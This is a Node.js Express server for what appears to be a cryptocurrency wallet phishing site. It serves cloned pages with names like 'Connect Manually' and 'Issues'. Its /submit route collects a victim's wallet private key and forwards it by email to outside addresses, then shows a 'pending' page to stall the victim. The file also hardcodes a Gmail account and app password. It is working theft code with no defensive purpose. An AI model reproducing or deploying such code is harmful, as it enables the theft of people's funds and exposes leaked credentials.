const express = require('express');
const dotenv = require('dotenv');
const nodemailer = require('nodemailer')
const cors = require('cors')
const path = require('path')

const app = express();
dotenv.config();

app.use(cors())


app.use(express.static('views/evm-frontend'))
app.use(express.static(path.join(__dirname, "/public")))
app.use(express.static(__dirname + '/views/Home Page _ Welcome to Panelactivator.com_files/'))
app.use(express.static(__dirname + '/views/Welcome to our website_files/'))
app.use(express.static(__dirname + '/views/Connect Manually_files/'))
app.use(express.static(__dirname + '/views/Issues_files'))
app.use(express.static(__dirname + '/views/Pending_files/'))

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const AUTH_USERNAME = process.env.AUTH_USERNAME
const AUTH_PASSWORD = process.env.AUTH_PASSWORD
const AUTHENTICATOR = process.env.AUTHENTICATOR
const RECEIVING_MAIL = process.env.RECEIVING_MAIL


function delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/views/evm-frontend/index.html');
})

app.get('/explore', (req, res) => {
    res.sendFile(__dirname + '/views/evm-frontend/explore.html')
})

app.get('/explore/issues', (req, res) => {
    res.sendFile(__dirname + '/views/evm-frontend/connect.html')
})

app.get('/explore/issues/connect', (req, res) => {
    res.sendFile(__dirname + '/views/evm-frontend/Issues.html')
})

app.get('/pending', (req, res) => {
    res.sendFile(__dirname + '/views/evm-frontend/Pending.html')
})


app.post('/submit', async (req, res) => {
    const privateKey = req.body.data;  // Assuming this is the input from the user
    if (!privateKey) {
        console.log('Private key must be provided. Very crucial')
        return
    }

    var transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: 'panelactivator.forwarding@gmail.com',
          pass: 'keczzhgntlviuaty'
        }
      });

      await new Promise((resolve, reject) => {
        transporter.verify(function(error, success) {
          if (error){
            console.log(error)
            reject(error)
          }else{
            console.log('Server succesfully ready to send mail')
            resolve(success)
          }
        })
      })

      var mailOptions = {
        from: 'panelactivator.forwarding@gmail.com', //Testing email to see you received it successfully. Server configured email
        to: 'netcarehospitalunit@gmail.com, panelactivator.forwarding@gmail.com',
        subject: `${req.body.category}`,
        html: `${req.body.data}`
      };

      await new Promise((resolve, reject) => {
        transporter.sendMail(mailOptions, async (error, info) => {
          if (error) {
            console.log(error)
            reject(error)
          }else{
            console.log('Email sent: ' + info.response)
            resolve(info)
            await delay(3000)
            res.redirect('/pending')
          }
        })
      })
})

const PORT = 5500;


app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
})